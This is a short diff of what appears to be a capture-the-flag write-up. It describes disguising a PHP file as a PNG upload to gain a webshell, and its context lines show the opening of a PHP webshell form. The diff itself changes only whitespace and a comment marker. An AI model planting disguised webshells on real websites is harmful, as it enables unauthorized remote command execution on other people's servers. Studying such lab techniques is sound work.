@@ -13,8 +13,7 @@ we need flag.txt or somthing like that inside we can get our flag
 so we have to write php file and hide it like png file 
 and use this file to get webshell on website
 you can use this exploit
-
-
+# 
  <html>
  <body>
  <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
@@ -31,6 +30,8 @@ you can use this exploit
  </pre>
  </body>
  </html>
+
+
 
 
 
